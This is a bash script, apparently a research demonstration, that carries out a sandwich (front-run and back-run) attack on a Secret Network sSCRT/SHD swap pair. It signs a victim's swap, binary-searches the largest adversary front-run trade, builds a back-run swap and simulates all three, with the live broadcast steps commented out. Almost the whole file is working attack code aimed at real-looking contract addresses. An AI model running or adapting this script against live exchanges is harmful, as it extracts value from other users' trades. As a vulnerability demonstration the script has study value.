#!/bin/bash

set -e
set -x

SECRETD=./secretd

#exchange_addr=secret1pak8feexy97myp22pjkxmsp5p8dmlkp4mkfxsl
CONTRACT_ADDRESS=secret1pak8feexy97myp22pjkxmsp5p8dmlkp4mkfxsl

SHD_ADDR=secret19ymc8uq799zf36wjsgu4t0pk8euddxtx5fggn8 ### token_0
sSCRT_ADDR=secret18vd8fpwxzck93qlwghaj6arh4p7c5n8978vsyg ### token_1


source ./scripts/demo_utils.sh

deposit_sSCRT() {
  TX=$(echo $PASSPHRASE | $SECRETD tx compute execute $sSCRT_ADDR "{\"deposit\": {}}" --from $USER --amount=$1 -y)
  wait_for_tx $TX
}

set_snip_20_viewing_key() {
  viewing_key=vk
  TX=$(echo $PASSPHRASE | $SECRETD tx compute execute $1 "{\"set_viewing_key\": {\"key\":\"$viewing_key\"}}" --from $2 -y)
  wait_for_tx $TX
}

query_snip_20_balance() {
  viewing_key=vk
  echo $PASSPHRASE | $SECRETD q compute query $1 "{\"balance\": {\"key\":\"$viewing_key\",\"address\":\"$2\"}}"
}

swap_sSCRT_to_SHD() {
  msg=$(echo -n "{\"swap\":{\"to\":\"$2\",\"expected_return\":\"$3\"}}" | base64 -w0)
  TX=$(echo $PASSPHRASE | $SECRETD tx compute execute $sSCRT_ADDR "{\"send\": {\"amount\":\"$1\",\"recipient\":\"$exchange_addr\",\"msg\":\"$msg\"}}" --gas 3000000 --from $USER --keyring-backend file -y)
  wait_for_tx $TX
}

query_pool() {
  eval pool_info=$(echo $PASSPHRASE | $SECRETD q compute query $exchange_addr "\"pair_info\"" | jq .pair_info.$1)
  echo $pool_info
}

generate_and_sign_swap() {
  msg=$(echo -n "{\"swap\":{\"to\":\"$1\",\"expected_return\":\"$3\"}}" | base64 -w0)
  generate_and_sign_tx "{\"send\": {\"amount\":\"$2\",\"recipient\":\"$exchange_addr\",\"msg\":\"$msg\"}}" $4 $5
}

query_pools() {
  echo "$SHD_ADDR query_pool amount_0"
  echo "$sSCRT_ADDR query_pool amount_1"
}

query_balances() {
  query_snip_20_balance $SHD_ADDR $VICTIM
  query_snip_20_balance $sSCRT_ADDR $VICTIM
  query_snip_20_balance $SHD_ADDR $ADV
  query_snip_20_balance $sSCRT_ADDR $ADV
}

set_viewing_keys() {
  set_snip_20_viewing_key $SHD_ADDR $VICTIM
  set_snip_20_viewing_key $sSCRT_ADDR $VICTIM
  set_snip_20_viewing_key $SHD_ADDR $ADV
  set_snip_20_viewing_key $sSCRT_ADDR $ADV
}

## turn SCRT to sSCRT
#deposit_sSCRT amt=1000000uscrt
#
#query_snip_20_balance $sSCRT_ADDR $USER
#query_snip_20_balance $SHD_ADDR $USER
#
#swap_sSCRT_to_SHD 100000 $USER 0
#
#query_snip_20_balance $sSCRT_ADDR $USER
#query_snip_20_balance $SHD_ADDR $USER
#
#set_viewing_keys

query_pools
query_balances

# make victim tx
generate_and_sign_swap $sSCRT_ADDR 10 20 $VICTIM victim
echo "victim tx $sSCRT 10 20"
echo

cnt=0
lo=0
hi=100
while [ $(expr $hi - $lo) -ne 1 ]; do
  set_snapshot "${UNIQUE_LABEL}-${cnt}"

  mid=$((($hi + $lo) / 2))
  echo "lo:$lo hi:$hi mid:$mid"

  generate_and_sign_swap $sSCRT_ADDR $mid 0 $ADV adv
  echo "adv tx token_a $mid 0"

  simulate_tx adv
  old_pool_a=$(query_pool amount_1)
  simulate_tx victim
  new_pool_a=$(query_pool amount_1)
  dif_pool_a=$(($new_pool_a - $old_pool_a))
  echo 'dif' $dif_pool_a

  if [ $dif_pool_a -gt 0 ]; then lo=$mid; else hi=$mid; fi
  cnt=$((cnt + 1))
  echo "=================================== end of a trial"
  echo
done

set_snapshot "${UNIQUE_LABEL}-${cnt}"
echo "final front-run tx token_a $lo 0"
old_pool_b=$(query_pool amount_0)
simulate_tx adv
new_pool_b=$(query_pool amount_0)
dif_pool_b=$(($old_pool_b - $new_pool_b))
generate_and_sign_swap $SHD_ADDR $dif_pool_b 0 $ADV adv_back
echo "final back-run tx token_b $dif_pool_b 0"

echo
# broadcast all 3 txs
set_snapshot "${UNIQUE_LABEL}-final"
simulate_tx adv
simulate_tx victim
simulate_tx adv_back

## broadcast all 3 txs
#reset_snapshot
#broadcast_tx adv
#broadcast_tx victim
## send back-run tx
#execute_tx token_b $dif_pool_b 0 $ADV

query_pools
query_balances

